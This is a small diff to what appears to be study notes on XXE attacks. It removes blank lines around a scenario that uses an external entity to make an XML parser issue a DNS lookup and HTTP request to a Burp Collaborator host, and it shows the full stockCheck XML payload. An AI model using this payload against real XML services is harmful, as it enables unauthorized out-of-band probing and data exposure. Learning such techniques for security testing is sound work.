@@ -75,9 +75,7 @@ payloads
 ``` secnerio: use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
     payloads:
     <?xml version="1.0" encoding="UTF-8"?>
-
         <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://pe7r5ma8pmiqhg5yu8d1hkk9b0hr5vtk.oastify.com/"> ]>
-
         <stockCheck>
             <productId>&xxe;</productId>
             <storeId>1</storeId>
